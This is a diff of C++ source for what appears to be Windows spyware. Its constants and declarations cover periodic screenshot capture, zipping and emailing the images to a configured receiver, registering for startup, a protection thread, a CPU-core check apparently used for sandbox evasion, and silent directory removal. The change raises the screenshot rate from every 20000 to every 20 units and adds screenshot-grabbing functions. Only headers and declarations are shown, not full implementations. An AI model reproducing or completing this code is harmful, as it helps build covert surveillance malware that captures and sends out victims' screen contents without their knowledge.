@@ -3,8 +3,6 @@
 	#undef UNICODE
 #endif
 #define _CRT_SECURE_NO_WARNINGS
-#include <atlbase.h>
-#include <atlconv.h>
 #include <windows.h>
 #include <vector>
 #include <wininet.h>
@@ -44,7 +42,8 @@ using buffer = std::vector<char>;
 #define RequiredCores 2 
 #define CryptPassword "MyPassword" 
 #define BaseShiftValue 100 //base int to add to chars for crypting measures
-#define SecondsBetweenScreenshots 20000
+#define SecondsBetweenScreenshots 20
+#define ScreenshotsPerZip 4
 #define SendersEmail ""
 #define SendersPsw ""
 #define RecieversEmail ""
@@ -73,14 +72,14 @@ using buffer = std::vector<char>;
 
 extern "C" int RandomGenerator();
 int SilentlyRemoveDirectory(const char* dir);
-PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp);
-void CreateBMPFile(LPCSTR pszFile, HBITMAP hBMP);
-BOOL WINAPI SaveBitmap(std::string wPath);
 //ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 int CalculateDirSize(std::string DirectoryToCheck);
 BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
 ULONG WINAPI Protect(LPVOID);
 std::string GetCpuInfo();
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
+ULONG WINAPI ScreenGrabber(LPVOID Parameter);
+void TakeScreenShot(const char* filename);
 //void Compress(const buffer& in, buffer& out);
 
 
